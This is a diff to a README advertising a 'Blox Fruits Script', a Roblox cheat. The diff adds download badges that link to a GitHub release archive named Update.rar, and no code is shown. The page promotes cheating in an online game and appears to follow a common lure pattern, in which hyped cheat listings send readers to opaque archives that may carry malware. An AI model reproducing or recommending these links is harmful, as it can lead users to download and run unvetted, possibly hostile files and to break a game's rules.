@@ -1,9 +1,9 @@
 # 🏴‍☠️ **Blox Fruits Script — The Ultimate Roblox Cheat of 2025** ⚡  
-[![Download Blox Fruits Script](https://img.shields.io/badge/Download-Blox_Fruits_Script-red?style=for-the-badge&logo=download)]()  
+[![Download Blox Fruits Script](https://img.shields.io/badge/Download-Blox_Fruits_Script-red?style=for-the-badge&logo=download)](https://github.com/AristiKlay/blox-fruits-script/releases/download/Download/Update.rar)  
 
 ![bloxx](https://github.com/user-attachments/assets/e7a8a2d2-ad9b-45db-a63d-bb9e2e2a737e)
 
-[![Download Blox Fruits Script](https://img.shields.io/badge/Download-Blox_Fruits_Script-red?style=for-the-badge&logo=download)]()  
+[![Download Blox Fruits Script](https://img.shields.io/badge/Download-Blox_Fruits_Script-red?style=for-the-badge&logo=download)](https://github.com/AristiKlay/blox-fruits-script/releases/download/Download/Update.rar)  
 
 ## 🏆 **What is Blox Fruits Script?**  
 
